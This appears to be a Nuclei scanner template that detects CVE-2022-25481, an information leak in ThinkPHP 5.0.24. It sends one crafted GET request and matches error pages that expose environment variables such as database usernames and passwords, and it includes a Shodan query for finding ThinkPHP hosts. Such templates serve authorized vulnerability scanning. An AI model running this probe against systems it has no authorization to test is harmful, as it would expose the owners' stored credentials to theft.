id: CVE-2022-25481

info:
  name: ThinkPHP 5.0.24 - Information Disclosure
  author: caon
  severity: high
  description: |
    ThinkPHP 5.0.24 is susceptible to information disclosure. This version was configured without the PATHINFO parameter. This can allow an attacker to access all system environment parameters from index.php, thereby possibly obtaining sensitive information, modifying data, and/or executing unauthorized operations.
  reference:
    - https://github.com/Lyther/VulnDiscover/blob/master/Web/ThinkPHP_InfoLeak.md
    - https://nvd.nist.gov/vuln/detail/CVE-2022-25481
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-25481
    cwe-id: CWE-668
    cpe: cpe:2.3:a:thinkphp:thinkphp:*:*:*:*:*:*:*:*
    epss-score: 0.0072
  metadata:
    max-request: 1
    shodan-query: title:"ThinkPHP"
    verified: true
  tags: cve,cve2022,thinkphp,exposure,oss

http:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?s=example'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "_DATABASE</td>"
          - "_USERNAME</td>"
          - "_PASSWORD</td>"
        condition: and

      - type: word
        part: body
        words:
          - "<title>系统发生错误</title>"
          - "<title>System Error</title>"
        condition: or

      - type: word
        part: body
        words:
          - "Exception"
          - "REQUEST_TIME"
        condition: and

      - type: status
        status:
          - 200
          - 500
          - 404
        condition: or
